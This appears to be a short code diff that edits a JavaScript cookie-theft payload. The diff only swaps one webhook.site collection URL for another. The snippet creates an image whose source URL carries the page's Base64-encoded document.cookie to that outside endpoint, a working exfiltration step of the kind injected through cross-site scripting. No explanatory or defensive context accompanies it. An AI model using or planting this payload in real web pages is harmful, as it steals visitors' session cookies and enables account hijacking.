@@ -1,2 +1,2 @@
 x = new Image(); 
-x.src = 'https://webhook.site/4b0c146c-2809-4480-9087-8137dcebfc30?data='+btoa(document.cookie);
+x.src = 'https://webhook.site/7c7af87c-32bf-4e4d-9a93-7c4c08a03c76?data='+btoa(document.cookie);
